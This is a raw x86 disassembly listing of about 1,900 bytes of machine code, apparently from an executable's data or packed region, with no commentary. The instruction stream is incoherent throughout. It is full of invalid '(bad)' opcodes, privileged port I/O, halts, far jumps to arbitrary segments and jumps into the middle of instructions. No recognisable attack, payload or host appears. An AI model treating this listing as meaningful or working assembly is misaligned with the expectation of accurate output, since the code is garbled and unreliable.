  415ddd:	sar    DWORD PTR [ecx-0x7c9862cf],cl
  415de3:	add    eax,0x1f8c8612
  415de8:	neg    BYTE PTR [ecx]
  415dea:	ss (bad) 
  415dec:	sub    esp,DWORD PTR [edx]
  415dee:	aaa    
  415def:	fcom   QWORD PTR [edi]
  415df1:	aas    
  415df2:	ja     0x415e11
  415df4:	aam    0x64
  415df6:	inc    ebp
  415df7:	iret   
  415df8:	cmp    dh,BYTE PTR [edi+eiz*1]
  415dfb:	stos   DWORD PTR es:[edi],eax
  415dfc:	fdivr  st(3),st
  415dfe:	xchg   ebp,eax
  415dff:	inc    ecx
  415e00:	jb     0x415dc3
  415e02:	pop    ds
  415e03:	push   esi
  415e04:	test   eax,0xb81155cc
  415e09:	int3   
  415e0a:	push   esi
  415e0b:	cmp    eax,0xd072a3fd
  415e10:	sahf   
  415e11:	in     eax,dx
  415e12:	xchg   edi,eax
  415e13:	push   ebp
  415e14:	push   0x4e30530c
  415e19:	mov    cl,0x3c
  415e1b:	push   0xd4a6e1de
  415e20:	retf   
  415e21:	mov    bh,0x8a
  415e23:	xor    esi,DWORD PTR ds:0x2a4d7258
  415e29:	jns    0x415ea3
  415e2b:	lds    edi,FWORD PTR [esi]
  415e2d:	lods   eax,DWORD PTR ds:[esi]
  415e2e:	sub    eax,0x78c113d
  415e33:	test   eax,0x6efc963
  415e38:	or     eax,0xb9bc9757
  415e3d:	test   BYTE PTR [edx],0x61
  415e40:	int    0xe6
  415e42:	or     edx,DWORD PTR [eax+0x17]
  415e45:	mov    WORD PTR [esi],ss
  415e47:	outs   dx,BYTE PTR ds:[esi]
  415e48:	xchg   ecx,eax
  415e49:	out    0x87,al
  415e4b:	pop    ecx
  415e4c:	fstp   DWORD PTR [edx]
  415e4e:	sar    DWORD PTR [edx],0x85
  415e51:	loope  0x415ddd
  415e53:	push   es
  415e54:	inc    edx
  415e55:	inc    edx
  415e56:	mov    eax,0x5971181d
  415e5b:	and    DWORD PTR [edi-0x29],eax
  415e5e:	mov    al,0xea
  415e60:	hlt    
  415e61:	mov    ds:0x856f1e68,eax
  415e66:	(bad)  [ecx-0xb8cb556]
  415e6c:	test   bl,bl
  415e6e:	jb     0x415e76
  415e70:	push   ds
  415e71:	jae    0x415e93
  415e73:	jp     0x415e1e
  415e75:	lea    ebp,[ebx-0x40622454]
  415e7b:	inc    edx
  415e7c:	fcomp  st(6)
  415e7e:	mov    eax,ds:0x3bdf30f9
  415e83:	mov    bh,0xdb
  415e85:	clc    
  415e86:	retf   0x88be
  415e89:	in     eax,0x8e
  415e8b:	bound  edi,QWORD PTR [ebx]
  415e8d:	inc    edx
  415e8e:	xchg   DWORD PTR [ecx+0x51],edx
  415e91:	sbb    BYTE PTR [eax+0x6382d5be],bh
  415e97:	add    BYTE PTR [esi+0x51c5986b],0xa2
  415e9e:	dec    edx
  415e9f:	mov    dl,BYTE PTR [ebx]
  415ea1:	retf   
  415ea2:	push   cs
  415ea3:	sti    
  415ea4:	jp     0x415e83
  415ea6:	cmp    edi,DWORD PTR [ecx-0x58]
  415ea9:	jo     0x415e57
  415eab:	ror    BYTE PTR [edx+ecx*2],cl
  415eae:	mov    dl,BYTE PTR [edi+0x6830a781]
  415eb4:	jns    0x415e61
  415eb6:	add    dh,BYTE PTR [ebx+0x3dcec420]
  415ebc:	ret    
  415ebd:	jb     0x415e72
  415ebf:	xor    BYTE PTR [ebx-0x4da46ed1],bl
  415ec5:	mov    edi,0x7a58c0a1
  415eca:	mov    ch,bh
  415ecc:	xchg   edx,eax
  415ecd:	sub    edx,0x27
  415ed0:	add    DWORD PTR [ebp+0x47],ecx
  415ed3:	mov    dl,0xfa
  415ed5:	fsub   DWORD PTR ds:0x54542801
  415edb:	mov    al,0x3f
  415edd:	(bad)  
  415ede:	push   eax
  415edf:	push   0x53541d5b
  415ee4:	sahf   
  415ee5:	sahf   
  415ee6:	dec    ebx
  415ee7:	mov    edx,0x3314a924
  415eec:	xchg   ecx,eax
  415eed:	jmp    0x415ef8
  415eef:	mov    ah,0x19
  415ef1:	dec    ebp
  415ef2:	(bad)  
  415ef3:	pop    es
  415ef4:	into   
  415ef5:	pop    ebx
  415ef6:	inc    esi
  415ef7:	into   
  415ef8:	sub    cl,cl
  415efa:	cmp    ch,BYTE PTR [eax]
  415efc:	mov    eax,0xd8d2fb8a
  415f01:	adc    esp,ecx
  415f03:	cmc    
  415f04:	mov    ss,WORD PTR [ebp-0x1a]
  415f07:	mov    esp,ebx
  415f09:	outs   dx,DWORD PTR fs:[esi]
  415f0b:	add    ah,BYTE PTR ds:0x7b5bf802
  415f11:	pop    ebp
  415f12:	inc    edi
  415f13:	js     0x415ef3
  415f15:	push   0xffffff86
  415f17:	jne    0x415f13
  415f19:	lods   eax,DWORD PTR ds:[esi]
  415f1a:	popf   
  415f1b:	imul   esp,DWORD PTR [eax+0x202c014f],0x33
  415f22:	cmp    ah,BYTE PTR [edx]
  415f24:	in     eax,dx
  415f25:	jno    0x415f55
  415f27:	mov    DWORD PTR [esi],0xb62a4f0
  415f2d:	mov    eax,0x837cc4e9
  415f32:	adc    esp,DWORD PTR [esi+0x48]
  415f35:	lods   eax,DWORD PTR ds:[esi]
  415f36:	push   ss
  415f37:	test   al,0x21
  415f39:	dec    edi
  415f3a:	test   al,0xe4
  415f3c:	add    ch,BYTE PTR [eax-0x75a9bed6]
  415f42:	int    0xd5
  415f44:	pop    es
  415f45:	loopne 0x415f62
  415f47:	out    0x1f,al
  415f49:	add    eax,0xb57be2d6
  415f4e:	sbb    eax,esi
  415f50:	dec    eax
  415f51:	pop    edx
  415f52:	pop    es
  415f53:	add    edx,edx
  415f55:	xchg   BYTE PTR [ecx-0x1a513f65],dh
  415f5b:	and    BYTE PTR [eax-0x38],ah
  415f5e:	lock jmp 0xc2c0f6f6
  415f64:	mov    BYTE PTR [eax+0x716e7ce9],ch
  415f6a:	adc    ebp,DWORD PTR [edx+0x2216c39c]
  415f70:	fcmovbe st,st(4)
  415f72:	or     al,ch
  415f74:	pusha  
  415f75:	pop    edi
  415f76:	xor    cl,ch
  415f78:	int3   
  415f79:	sbb    DWORD PTR [eax+ecx*4],ebp
  415f7c:	into   
  415f7d:	and    ah,BYTE PTR [ebp+0x4b179217]
  415f83:	xor    esp,DWORD PTR [esi]
  415f85:	cdq    
  415f86:	push   0x52332e87
  415f8b:	push   0x4eb99c27
  415f90:	arpl   WORD PTR [edi+0x67],dx
  415f93:	xchg   esp,eax
  415f94:	sub    cl,BYTE PTR [edi-0x10915853]
  415f9a:	push   esi
  415f9b:	and    BYTE PTR ds:0x1ad2dcae,al
  415fa1:	fwait
  415fa2:	dec    edx
  415fa3:	fadd   DWORD PTR [edx+0x7f]
  415fa6:	mov    BYTE PTR [eax+edx*1+0x1f],al
  415faa:	pop    esi
  415fab:	xchg   ebx,eax
  415fac:	or     esi,edi
  415fae:	sti    
  415faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb0:	mov    eax,0x951a5958
  415fb5:	std    
  415fb6:	adc    DWORD PTR [esi+0x78],0xf367cc16
  415fbd:	les    esp,FWORD PTR [edx+0x5e]
  415fc0:	push   ss
  415fc1:	in     eax,dx
  415fc2:	dec    esi
  415fc3:	in     al,dx
  415fc4:	in     al,0x14
  415fc6:	gs dec ecx
  415fc8:	dec    edx
  415fc9:	ret    
  415fca:	(bad)  
  415fcb:	and    edi,DWORD PTR [eax-0x40a2816]
  415fd1:	daa    
  415fd2:	jmp    0x415fe7
  415fd4:	dec    ecx
  415fd5:	in     al,0xd2
  415fd7:	pop    ss
  415fd8:	push   0x13
  415fda:	xchg   ebp,eax
  415fdb:	pusha  
  415fdc:	dec    esp
  415fdd:	push   ebp
  415fde:	lods   al,BYTE PTR ds:[esi]
  415fdf:	xchg   esi,eax
  415fe0:	arpl   WORD PTR [edi+ebx*8+0x19],bx
  415fe4:	jp     0x41602f
  415fe6:	push   edx
  415fe7:	mov    ds:0xaf645218,al
  415fec:	repz mov ds:0x2da5fe39,al
  415ff2:	inc    edi
  415ff3:	dec    BYTE PTR [esi]
  415ff5:	pop    edx
  415ff6:	rol    BYTE PTR [eax+0x7b],0xed
  415ffa:	xchg   esp,eax
  415ffb:	clc    
  415ffc:	out    0xf6,eax
  415ffe:	xor    ah,BYTE PTR [ebp+0x8]
  416001:	inc    ecx
  416002:	imul   edi,esi,0x18
  416005:	pop    ds
  416006:	jno    0x41606c
  416008:	pop    ebx
  416009:	push   edi
  41600a:	test   eax,0x3836ecd1
  41600f:	jae    0x416071
  416011:	pop    esp
  416012:	hlt    
  416013:	inc    ecx
  416014:	mov    ebp,eax
  416016:	cmp    DWORD PTR [ebx-0x46d1b869],0x1bd98e68
  416020:	daa    
  416021:	and    bh,dl
  416023:	mov    ds:0xdcd4d40a,al
  416028:	push   esp
  416029:	adc    BYTE PTR [edi+0x51],0x4e
  41602d:	adc    DWORD PTR [esi+0x4b0409c2],esi
  416033:	jnp    0x416056
  416035:	dec    edx
  416036:	jl     0x41601f
  416038:	scas   eax,DWORD PTR es:[edi]
  416039:	jp     0x415fcc
  41603b:	nop
  41603c:	sub    cl,ah
  41603e:	adc    DWORD PTR [esi+ecx*2],edx
  416041:	add    BYTE PTR [esi+edx*2],ah
  416044:	cmp    DWORD PTR [eax],0xfffffffa
  416047:	out    0xac,eax
  416049:	lahf   
  41604a:	inc    ecx
  41604b:	jne    0x415fd6
  41604d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41604e:	add    BYTE PTR [eax+0x47be6f7b],ch
  416054:	scas   al,BYTE PTR es:[edi]
  416055:	add    eax,0x3911f643
  41605a:	retf   
  41605b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41605c:	mov    edi,0x46c5cd0c
  416061:	jp     0x41607f
  416063:	or     DWORD PTR ds:0x9f0c0070,ebp
  416069:	or     eax,0xee2055de
  41606e:	sub    BYTE PTR [ecx-0x1a3c4bce],al
  416074:	cld    
  416075:	mov    ebx,0xb993329d
  41607a:	retf   
  41607b:	add    eax,0x6d0e1a0f
  416080:	push   ebx
  416081:	stos   BYTE PTR es:[edi],al
  416082:	es stos BYTE PTR es:[edi],al
  416084:	mov    al,ds:0xfb424a3b
  416089:	ficomp WORD PTR [eax-0x39c45822]
  41608f:	adc    al,0x9c
  416091:	jno    0x416061
  416093:	xor    al,0x42
  416095:	cmp    al,0xac
  416097:	out    0xed,eax
  416099:	dec    ecx
  41609a:	jne    0x416044
  41609c:	adc    ebx,DWORD PTR [eax+0x4c62a226]
  4160a2:	aas    
  4160a3:	sar    DWORD PTR [ebp-0x19b2126],1
  4160a9:	mov    BYTE PTR [ecx-0x43c758bb],bh
  4160af:	cmp    edx,DWORD PTR [ebx+edi*2+0x3e373fae]
  4160b6:	mov    esi,ebx
  4160b8:	shr    BYTE PTR [ecx+0xf],0x50
  4160bc:	or     DWORD PTR [ebp+0x10151437],esp
  4160c2:	je     0x4160b9
  4160c4:	mov    cl,0x54
  4160c6:	pop    esp
  4160c7:	inc    esp
  4160c8:	ins    BYTE PTR es:[edi],dx
  4160c9:	add    eax,DWORD PTR [ecx+0x142a760a]
  4160cf:	xor    BYTE PTR [edx-0x595782ba],cl
  4160d5:	or     eax,0xdb0fe996
  4160da:	enter  0xc738,0x7e
  4160de:	sbb    eax,0xbbf6f873
  4160e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160e4:	jo     0x4160ec
  4160e6:	into   
  4160e7:	and    DWORD PTR [edx-0x39],esp
  4160ea:	mov    eax,ds:0x8d54f5d7
  4160ef:	sbb    ebx,esp
  4160f1:	dec    ecx
  4160f2:	mov    dl,0x8c
  4160f4:	pop    ebx
  4160f5:	adc    bh,cl
  4160f7:	(bad)  
  4160f8:	jmp    0x40bc4c2b
  4160fd:	inc    ecx
  4160fe:	fucomi st,st(6)
  416100:	icebp  
  416101:	adc    ebx,DWORD PTR [ebp-0x54]
  416104:	arpl   WORD PTR [esi],sp
  416106:	(bad)
  416109:	mov    BYTE PTR [ebx],bh
  41610b:	ret    
  41610c:	sbb    ecx,esp
  41610e:	inc    ecx
  41610f:	and    dh,BYTE PTR [esi+0x10]
  416112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416113:	jns    0x4160f5
  416115:	mov    ah,ah
  416117:	mov    bl,0xc
  416119:	mov    esi,0x6037ba7
  41611e:	sub    ah,BYTE PTR [edx+0x28ae5333]
  416124:	mov    ebp,0x1badf05e
  416129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41612a:	pop    edx
  41612b:	xchg   esi,eax
  41612c:	fsub   QWORD PTR [eax-0x77821b39]
  416132:	xor    ebp,edi
  416134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416135:	mov    ds:0x79767f17,al
  41613a:	hlt    
  41613b:	pop    edi
  41613c:	mov    bl,0x19
  41613e:	jp     0x41611e
  416140:	pop    edx
  416141:	and    DWORD PTR [edx],0x4d1eebf0
  416147:	bound  esp,QWORD PTR [edi+0x57eef027]
  41614d:	cs push ecx
  41614f:	dec    ebx
  416150:	pop    ebx
  416151:	fld    TBYTE PTR [ebp-0x440e04ee]
  416157:	or     BYTE PTR [ecx-0x71],ch
  41615a:	fisttp DWORD PTR [ebp-0x5]
  41615d:	dec    ecx
  41615e:	mov    dh,0xbc
  416160:	test   al,0x48
  416162:	mov    eax,ds:0xc26271f5
  416167:	dec    ebx
  416168:	and    DWORD PTR [edi+ebx*4],ecx
  41616b:	mov    cs,WORD PTR [edi]
  41616d:	mov    ecx,0x85fd023d
  416172:	inc    esp
  416173:	mul    DWORD PTR [ecx]
  416175:	outs   dx,BYTE PTR ds:[esi]
  416176:	inc    esp
  416177:	sbb    BYTE PTR cs:[ecx],bh
  41617a:	xchg   edi,eax
  41617b:	fwait
  41617c:	test   eax,0xf6f282c1
  416181:	push   eax
  416182:	fistp  WORD PTR [bx+si-0x58d]
  416187:	or     al,0x89
  416189:	daa    
  41618a:	add    BYTE PTR [esi+edi*8],0x8f
  41618e:	cmp    ebx,DWORD PTR [ebx-0x45]
  416191:	or     ecx,DWORD PTR [ebp-0x464c9160]
  416197:	or     dl,BYTE PTR [edi]
  416199:	and    al,dh
  41619b:	(bad)  
  41619c:	cdq    
  41619d:	mov    ebp,0x85016633
  4161a2:	sti    
  4161a3:	push   0x169e494c
  4161a8:	xor    al,BYTE PTR [edi+0x10]
  4161ab:	mov    al,0x2b
  4161ad:	push   cs
  4161ae:	inc    ebx
  4161af:	out    0x2,al
  4161b1:	fs cli 
  4161b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161b4:	dec    edx
  4161b5:	sbb    bl,BYTE PTR [edi-0x2c]
  4161b8:	das    
  4161b9:	adc    bh,cl
  4161bb:	cmc    
  4161bc:	jnp    0x4161b7
  4161be:	addr16 pusha 
  4161c0:	xchg   ebx,eax
  4161c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161c3:	sbb    DWORD PTR [edx-0x60],0xffffff95
  4161c7:	popa   
  4161c8:	xor    al,0x65
  4161ca:	int3   
  4161cb:	push   ebp
  4161cc:	mov    edx,0x4f14c9e8
  4161d1:	retf   0x9736
  4161d4:	cmp    eax,edx
  4161d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d7:	cli    
  4161d8:	push   ecx
  4161d9:	mov    ebx,0x97a11de2
  4161de:	test   DWORD PTR [edi-0x43],ecx
  4161e1:	sbb    BYTE PTR [eax+0x62],al
  4161e4:	push   esp
  4161e5:	loopne 0x416173
  4161e7:	sar    DWORD PTR [ecx+0x4],1
  4161ea:	leave  
  4161eb:	outs   dx,DWORD PTR ds:[esi]
  4161ec:	int3   
  4161ed:	call   0x5017159b
  4161f2:	inc    edi
  4161f3:	dec    ecx
  4161f4:	mov    bl,0x73
  4161f6:	jmp    0x416187
  4161f8:	mov    ch,0xaf
  4161fa:	cmp    BYTE PTR [ecx-0x4b],bl
  4161fd:	push   0x3b
  4161ff:	adc    ebx,esi
  416201:	mov    al,0x7b
  416203:	jns    0x4161d7
  416205:	in     al,dx
  416206:	push   ecx
  416207:	popa   
  416208:	xor    esi,ebx
  41620a:	add    eax,0x60914fbb
  41620f:	loopne 0x416275
  416211:	adc    eax,0x53ef0b11
  416216:	aas    
  416217:	mov    esp,0x92eebdc
  41621c:	adc    eax,0x33e02c34
  416221:	out    0xc8,eax
  416223:	push   ds
  416224:	add    ecx,eax
  416226:	iret   
  416227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416228:	or     DWORD PTR fs:[ebx+ebp*4],ecx
  41622c:	or     esi,DWORD PTR [ebp+0x4c5f2659]
  416232:	jl     0x416216
  416234:	mov    dl,0x7b
  416236:	push   esi
  416237:	mov    ch,0x72
  416239:	les    esp,FWORD PTR ds:0xdd825b50
  41623f:	jo     0x416225
  416241:	sahf   
  416242:	ds int 0xf3
  416245:	sub    DWORD PTR ds:0x73d6dd22,edx
  41624b:	daa    
  41624c:	mov    cl,0x3e
  41624e:	ins    DWORD PTR es:[edi],dx
  41624f:	xor    ebp,esp
  416251:	in     eax,dx
  416252:	mov    ?,WORD PTR [ebp+ebx*1+0x55]
  416256:	retf   
  416257:	pop    ebx
  416258:	inc    ebx
  416259:	out    0xf7,eax
  41625b:	call   0xd622:0xb7e9d122
  416262:	jecxz  0x416288
  416264:	cwde   
  416265:	mov    dh,0x94
  416267:	mov    ecx,0x3aa0df98
  41626c:	stos   BYTE PTR es:[edi],al
  41626d:	fcom   QWORD PTR [eax+esi*8]
  416270:	mov    cl,0x9b
  416272:	jmp    0xb65d:0x657e06ea
  416279:	fwait
  41627a:	inc    ecx
  41627b:	test   DWORD PTR [esi],edx
  41627d:	sub    dl,BYTE PTR [bp+0x6631]
  416282:	add    eax,0xb262c95b
  416287:	iret   
  416288:	lock cwde 
  41628a:	jne    0x416309
  41628c:	fidiv  DWORD PTR [edi]
  41628e:	icebp  
  41628f:	in     al,dx
  416290:	ins    DWORD PTR es:[edi],dx
  416291:	jne    0x4162f7
  416293:	fcomp  QWORD PTR [ecx+edx*2]
  416296:	in     al,0xd3
  416298:	and    al,0x5a
  41629a:	in     eax,0xb
  41629c:	mov    ch,0x8f
  41629e:	mov    edi,0x9d893fa0
  4162a3:	iret   
  4162a4:	mov    ds:0x65d51ad2,eax
  4162a9:	out    0xf7,al
  4162ab:	(bad)  
  4162ac:	cmp    BYTE PTR [edx],ah
  4162ae:	rol    DWORD PTR [ebp-0x21],cl
  4162b1:	aaa    
  4162b2:	rcl    DWORD PTR [ebx],0x3d
  4162b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162b6:	dec    eax
  4162b7:	jae    0x416282
  4162b9:	daa    
  4162ba:	sbb    edx,ebp
  4162bc:	outs   dx,DWORD PTR ds:[esi]
  4162bd:	in     eax,dx
  4162be:	jge    0x416323
  4162c0:	mov    edi,0xd1f27aba
  4162c5:	pop    edx
  4162c6:	adc    dl,dl
  4162c8:	pop    ebx
  4162c9:	std    
  4162ca:	mov    WORD PTR [edi],ds
  4162cc:	push   ebx
  4162cd:	jno    0x4162d8
  4162cf:	xor    BYTE PTR [eax+0x73ff5a00],dl
  4162d5:	and    BYTE PTR [esi+0x59],0xe5
  4162d9:	test   esi,eax
  4162db:	add    ebp,ebx
  4162dd:	xchg   esp,eax
  4162de:	add    BYTE PTR [edx],cl
  4162e0:	inc    edi
  4162e1:	mov    al,0xd1
  4162e3:	sbb    BYTE PTR [esi-0x35],0xa2
  4162e7:	mov    ch,0x7
  4162e9:	es jo  0x416325
  4162ec:	mov    dh,0x97
  4162ee:	ds in  al,dx
  4162f0:	pop    ebp
  4162f1:	xchg   edx,eax
  4162f2:	test   DWORD PTR [eax+0x2c],0x3c347b70
  4162f9:	jmp    0x8868:0x1f5dac51
  416300:	pop    ds
  416301:	repnz xor DWORD PTR [esp+ebp*2+0x1b],ebx
  416306:	jmp    0x1d36:0xdf721f89
  41630d:	fsub   st,st(0)
  41630f:	ins    BYTE PTR es:[edi],dx
  416310:	cmc    
  416311:	and    ebx,edi
  416313:	and    al,0xc5
  416315:	dec    esp
  416316:	in     eax,0x67
  416318:	adc    dh,BYTE PTR [ecx-0x4c9e8d6d]
  41631e:	ret    0x42ab
  416321:	xor    dh,BYTE PTR [esi+edi*2]
  416324:	and    BYTE PTR [ecx],dl
  416326:	je     0x416382
  416328:	mov    ebp,0x306ab48e
  41632d:	stos   BYTE PTR es:[edi],al
  41632e:	push   ss
  41632f:	xchg   ebp,eax
  416330:	ret    
  416331:	lds    esp,FWORD PTR [edx]
  416333:	jg     0x416339
  416335:	sbb    ah,dh
  416337:	or     BYTE PTR [edx+edx*8],0x97
  41633b:	scas   al,BYTE PTR es:[edi]
  41633c:	int3   
  41633d:	jge    0x4163b3
  41633f:	xchg   edx,eax
  416340:	ins    BYTE PTR es:[edi],dx
  416341:	xchg   BYTE PTR [ebp-0x2859881c],ah
  416347:	fs push esp
  416349:	adc    DWORD PTR [eax],0x3bdd51db
  41634f:	add    ebp,esi
  416351:	pop    es
  416352:	call   0xa73a:0x25b23961
  416359:	je     0x41638c
  41635b:	out    0xcb,al
  41635d:	cmp    edi,edi
  41635f:	mov    ah,bh
  416361:	mov    ?,WORD PTR [ecx+ebp*2+0x3fc46455]
  416368:	jp     0x41637f
  41636a:	adc    ebx,ebx
  41636c:	and    BYTE PTR [ecx+eax*8+0x15],dl
  416370:	push   0x8492e27d
  416375:	push   edx
  416376:	adc    al,0xde
  416378:	jae    0x4163d2
  41637a:	loopne 0x416362
  41637c:	and    eax,0xc11a4948
  416381:	sub    dl,BYTE PTR [edi+0x67]
  416384:	clc    
  416385:	daa    
  416386:	xor    al,0x12
  416388:	clc    
  416389:	dec    eax
  41638a:	xor    al,0xb7
  41638c:	pop    ebx
  41638d:	test   eax,0x35158292
  416392:	sbb    ah,BYTE PTR [edi+0x4f]
  416395:	xlat   BYTE PTR ds:[ebx]
  416396:	xchg   esp,eax
  416397:	das    
  416398:	in     eax,0x49
  41639a:	add    bh,BYTE PTR [edi]
  41639c:	xor    eax,0xf67d8960
  4163a1:	cmp    al,BYTE PTR [eax+0x59]
  4163a4:	(bad)  
  4163a5:	mov    edx,0x911005f3
  4163aa:	out    0x68,al
  4163ac:	dec    eax
  4163ad:	imul   esi,DWORD PTR [esi],0xa549ad45
  4163b3:	dec    edi
  4163b4:	retf   
  4163b5:	adc    al,0x93
  4163b7:	mov    ds:0x4369d88d,al
  4163bc:	(bad)  
  4163be:	jne    0x416415
  4163c0:	fstp   st(5)
  4163c2:	inc    ebp
  4163c3:	inc    ebp
  4163c4:	aad    0x94
  4163c6:	fadd   DWORD PTR [ebx+0x27e5c077]
  4163cc:	sbb    dh,BYTE PTR [ebp+0x2a]
  4163cf:	xor    al,0xfc
  4163d1:	and    al,0x8a
  4163d3:	push   ds
  4163d4:	loopne 0x4163ce
  4163d6:	adc    al,0x34
  4163d8:	(bad)  
  4163d9:	es dec ecx
  4163db:	jle    0x416457
  4163dd:	xor    dl,BYTE PTR [edx-0x1b]
  4163e0:	push   0xffffff8b
  4163e2:	pop    eax
  4163e3:	in     eax,0x4d
  4163e5:	mov    dh,0x9d
  4163e7:	outs   dx,DWORD PTR ds:[esi]
  4163e8:	fsubr  st,st(1)
  4163ea:	xchg   ecx,eax
  4163eb:	add    al,0x42
  4163ed:	mov    edi,0x151f811b
  4163f2:	or     DWORD PTR [edx],esi
  4163f4:	pop    ss
  4163f5:	pop    ebx
  4163f6:	dec    ecx
  4163f7:	mov    bh,0x84
  4163f9:	inc    edx
  4163fa:	xchg   esi,eax
  4163fb:	test   eax,0x199bbcd9
  416400:	xchg   edx,eax
  416401:	mov    DWORD PTR [edx-0x40],esi
  416404:	fwait
  416405:	icebp  
  416406:	and    al,0x57
  416408:	adc    ecx,ebp
  41640a:	stc    
  41640b:	stos   DWORD PTR es:[edi],eax
  41640c:	popa   
  41640d:	addr16 (bad) 
  41640f:	arpl   WORD PTR [edx],ax
  416411:	xchg   edx,eax
  416412:	retf   0xc953
  416415:	sbb    BYTE PTR [ecx+0x4a6fdc24],0xe
  41641c:	out    dx,eax
  41641d:	push   edx
  41641e:	add    DWORD PTR ds:0xb0d7f956,esi
  416424:	xor    esi,DWORD PTR [edx]
  416426:	dec    edi
  416427:	sub    al,0xce
  416429:	sti    
  41642a:	mov    ah,0xca
  41642c:	cmp    DWORD PTR [edi-0x40f10478],edx
  416432:	or     BYTE PTR [eax-0x7511a2e0],dh
  416438:	and    dl,0xb
  41643b:	mov    ch,0xa2
  41643d:	int    0xf5
  41643f:	call   0xb550:0x36b84186
  416446:	int    0x55
  416448:	sub    BYTE PTR [eax+0x7126d0c],bh
  41644e:	lods   eax,DWORD PTR ds:[esi]
  41644f:	push   eax
  416450:	lahf   
  416451:	mov    bl,0x85
  416453:	jns    0x41642e
  416455:	idiv   ah
  416457:	mov    ch,0xe0
  416459:	adc    DWORD PTR [ebx+ebx*4],esp
  41645c:	ins    BYTE PTR es:[edi],dx
  41645d:	fxch   st(3)
  41645f:	xor    al,al
  416461:	ss clc 
  416463:	push   cs
  416464:	pop    eax
  416465:	sar    DWORD PTR [edi+0x6f],cl
  416468:	cmp    al,BYTE PTR [edx-0x6431019a]
  41646e:	dec    esi
  41646f:	call   0x96139c0a
  416474:	inc    ebp
  416475:	mov    edx,0xc776b16b
  41647a:	xchg   edi,eax
  41647b:	push   0xa
  41647d:	std    
  41647e:	xchg   DWORD PTR [eax-0x64],eax
  416481:	call   0xf2e0:0xe2e6271d
  416488:	mov    esp,DWORD PTR [eax]
  41648a:	outs   dx,BYTE PTR ds:[esi]
  41648b:	mov    dl,0xa2
  41648d:	jns    0x41641a
  41648f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416491:	scas   al,BYTE PTR es:[edi]
  416492:	(bad)  
  416493:	(bad)  
  416494:	in     al,dx
  416495:	xor    ah,0x8f
  416498:	fsubr  DWORD PTR [ebx]
  41649a:	mov    ds:0x76bf4ef1,al
  41649f:	pop    edx
  4164a1:	jo     0x416482
  4164a3:	mov    ebp,0x1eb4eab6
  4164a8:	adc    esi,edi
  4164aa:	mov    DWORD PTR [eax-0x36],edi
  4164ad:	jl     0x416514
  4164af:	sti    
  4164b0:	cmp    BYTE PTR ds:0x7356310a,ah
  4164b6:	push   ss
  4164b7:	jmp    0x4f6d66e2
  4164bc:	dec    esi
  4164bd:	sahf   
  4164be:	bound  esp,QWORD PTR [ebp+0x16]
  4164c1:	stos   DWORD PTR es:[edi],eax
  4164c2:	ja     0x416502
  4164c4:	inc    esp
  4164c5:	(bad)  [ecx]
  4164c7:	mov    ds:0xf3ed287,al
  4164cc:	frstor [ecx-0x16]
  4164cf:	sub    al,0x37
  4164d1:	inc    esi
  4164d2:	pop    ebp
  4164d3:	(bad)  
  4164d4:	jl     0x4164c6
  4164d6:	(bad)  
  4164d7:	es mov eax,0xcdd8a4a4
  4164dd:	mov    ebp,0x1e2dd255
  4164e2:	popa   
  4164e3:	scas   eax,DWORD PTR es:[edi]
  4164e4:	or     ah,BYTE PTR [esp+ebp*2-0x771d477]
  4164eb:	retf   0x7fec
  4164ee:	ret    0x6a65
  4164f1:	push   0xbe8e2628
  4164f6:	in     al,dx
  4164f7:	mov    es,esp
  4164f9:	mov    ecx,0x7a798ebe
  4164fe:	xchg   edx,eax
  4164ff:	mov    WORD PTR [esi+0x7c8742b6],?
  416505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416506:	in     eax,0xdd
  416508:	pop    es
  416509:	sbb    ebp,DWORD PTR [edi]
  41650b:	mov    BYTE PTR [eax+0x41],bh
  41650e:	mov    eax,ds:0xb923dd6e
  416513:	adc    eax,0x87fab458
  416518:	icebp  
  416519:	mov    esp,0xce544d45
  41651e:	dec    sp
  416520:	pushf  
  416521:	sub    al,0x3e
  416523:	dec    ebp
  416524:	dec    edi
  416525:	push   ebp
  416526:	ret    0x29c0
  416529:	push   ebp
  41652a:	pop    ds
  41652b:	xor    ch,bh
  41652d:	xchg   bh,ah
  41652f:	outs   dx,BYTE PTR ds:[esi]
  416530:	mov    edx,0x40081667
  416535:	jmp    0xba56:0x4cc5f8f3
  41653c:	adc    eax,0x208f92f0
  416541:	xlat   BYTE PTR ds:[ebx]
  416542:	sub    DWORD PTR es:[edi],edx
  416545:	ja     0x4164fd
  416547:	mov    bh,0x1c
  416549:	int3   
  41654a:	mov    edi,0xc2d24dce
  41654f:	jb     0x4165b2
  416551:	push   cs
  416552:	push   cs
  416553:	dec    ecx
  416554:	mov    ds:0xa6e002c3,al
  416559:	scas   al,BYTE PTR es:[edi]
  41655a:	mov    bh,0x33
  41655c:	ja     0x4165b8
  41655e:	icebp  
  41655f:	es das 
  416561:	mov    ebx,0x7e58b51
  416566:	je     0x4165c4
  416568:	adc    edi,DWORD PTR [edi-0x37]
  41656b:	mov    al,0x74
  41656d:	add    BYTE PTR [edx+edx*4-0x24e40527],0x74
  416575:	dec    esp
  416576:	or     al,0xfb
  416578:	dec    edx
  416579:	or     BYTE PTR [edi+edx*8],bh
  41657c:	adc    DWORD PTR [ecx-0x5d],ecx
  41657f:	lock retf 
  416581:	mov    cl,0x34
  416583:	pop    ebx
  416584:	mov    WORD PTR [edi+0x54b9d54a],es
  41658a:	out    dx,al
  41658b:	hlt    
  41658c:	xchg   ebp,eax
  41658d:	jmp    0x9ba3e32f
  416592:	pop    ebx
  416593:	cmp    ebx,ebx
  416595:	sbb    al,0xb7
  416597:	sub    BYTE PTR [ebx-0x52bd0449],al
  41659d:	inc    eax
  41659e:	inc    esi
  41659f:	rcr    ebp,1
  4165a1:	xor    bl,dh
